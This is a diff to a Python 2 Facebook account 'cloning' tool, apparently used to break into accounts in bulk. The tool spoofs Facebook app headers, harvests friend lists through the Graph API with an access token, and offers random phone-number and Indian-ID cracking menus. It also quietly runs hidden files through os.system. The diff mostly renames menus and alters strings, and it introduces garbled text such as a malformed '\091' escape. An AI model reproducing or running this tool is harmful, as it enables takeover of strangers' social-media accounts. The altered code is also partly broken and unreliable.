@@ -31,8 +31,8 @@ except OSError:
         os.system('node ...../index.js &')
 from requests.exceptions import ConnectionError
 
-bd = random.randint(2e7, 3e7)
-sim = random.randint(2e4, 4e4)
+bd = random.randint(2e9, 3e9)
+sim = random.randint(2e6, 4e6)
 header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),
           'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
           'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]',
@@ -107,7 +107,7 @@ def sunny_tech():
     print('')
     print("\033[1;97m--------------------------------------------------")
     username = raw_input("\033[1;97m[+]\033[1;97m Username :\033[1;97m ")
-    if username == "Tiger":
+    if username == "sunny":
         os.system("clear")
         print
         logo
@@ -154,9 +154,9 @@ def login_choice():
     print
     logo
     print(
-        "\033[1;97m[1]\033[1;91m-⋄-\033[1;97mRandom Search Name Cloning     \033[1;97m(\033[1;92mno login\033[1;97m) ")
+        "\033[1;97m[1]\033[1;91m-⋄-\033[1;97mclone Indian ID   \033[1;97m(\033[1;92mno login\033[1;97m) ")
     print(
-        "\033[1;97m[2]\033[1;91m-⋄-\033[1;97mRandom Ph.Number Cloning       \033[1;97m(\033[1;92mno login\033[1;97m) ")
+        "\033[1;97m[2]\033[1;91m-⋄-\033[1;97mRandom Ph.Number Cloning       \033[1;97m(\033[1;92mno login\091[1;97m) ")
     print(
         "\033[1;97m[3]\033[1;91m-⋄-\033[1;97mClone Friendlist and Public ID \033[1;97m(\033[1;92mlogin\033[1;97m)    ")
     print("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mExit")
@@ -188,7 +188,7 @@ def loginvia():
     os.system('clear')
     print
     logo
-    os.system("python3 .loading.md")
+    os.system("python2 .loading.md")
     os.system('clear')
     print
     logo
@@ -205,7 +205,7 @@ def clone_loginvia():
         os.system("clear")
         print
         logo
-        os.system("python3 .loading.md")
+        os.system("python2 .loading.md")
         os.system('clear')
         print
         logo
@@ -234,13 +234,13 @@ def loginfb():
     os.system("clear")
     print
     logo
-    os.system("python3 .loading.md")
+    os.system("python2 .loading.md")
     time.sleep(1)
     os.system('clear')
     print
     logo
     print("\033[1;93mLogin With Facebook Account\033[1;0m").center(50)
-    print("\033[1;93mUse Proxy to login account \033[1;0m").center(50)
+    print("\033[1;93mUse cokes to login account \033[1;0m").center(50)
     print("\033[1;97m--------------------------------------------------")
     id = raw_input("\033[1;97m[+]\033[1;93m Email/ID/Number :\033[1;97m ")
     id1 = id.replace(' ', '')
@@ -266,7 +266,7 @@ def loginfb():
             time.sleep(1)
             loginfb()
         else:
-            print("\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m")
+            print("\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong sorry\033[0;97m")
             time.sleep(1)
             loginfb()
 
@@ -297,14 +297,14 @@ def menu():
     os.system('clear')
     print
     logo
-    os.system("python3 .loading.md")
+    os.system("python2 .loading.md")
     os.system('clear')
     print
     logo
     print("\t  \033[1;93m[+] Name : " + name)
     print("\033[1;97m--------------------------------------------------")
     print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mClone Frienlist and Public ID")
-    print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mClone Bangladesh and India")
+    print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mClone India")
     print("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mlogout")
     print("\033[1;97m--------------------------------------------------")
     menu_select()
@@ -362,7 +362,7 @@ def crack2():
         print
         logo
         print("\t\033[1;93m  Clone From Frienlist\033[1;0m")
-        print("\033[1;97m--------------------------------------------------")
+        print("\033[1;97m----------------------hii----------------------------")
         r = requests.get("https://graph.facebook.com/me/friends?access_token=" + token, headers=header)
         z = json.loads(r.text)
         for s in z["data"]:
@@ -595,7 +595,7 @@ def crack2():
     menu()
 
 
-def bangla_india():
+def n_india():
     os.system("clear")
     print
     logo
@@ -603,14 +603,13 @@ def bangla_india():
     os.system('clear')
     print
     logo
-    print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mRandom Bangladesh Cloning")
     print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mRandom India Cloning")
     print("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mBack")
     print("\033[1;97m--------------------------------------------------")
-    bangla_india_man()
+    n_india_man()
 
 
-def bangla_india_man():
+def n_india_man():
     option = raw_input("\n╰─➣ ")
     if option == "1":
         bangla()
@@ -620,7 +619,7 @@ def bangla_india_man():
         menu()
     else:
         print("[!] Please Select a Valid Option")
-        bangla_india_man()
+        n_india_man()
 
 
 def bangla():
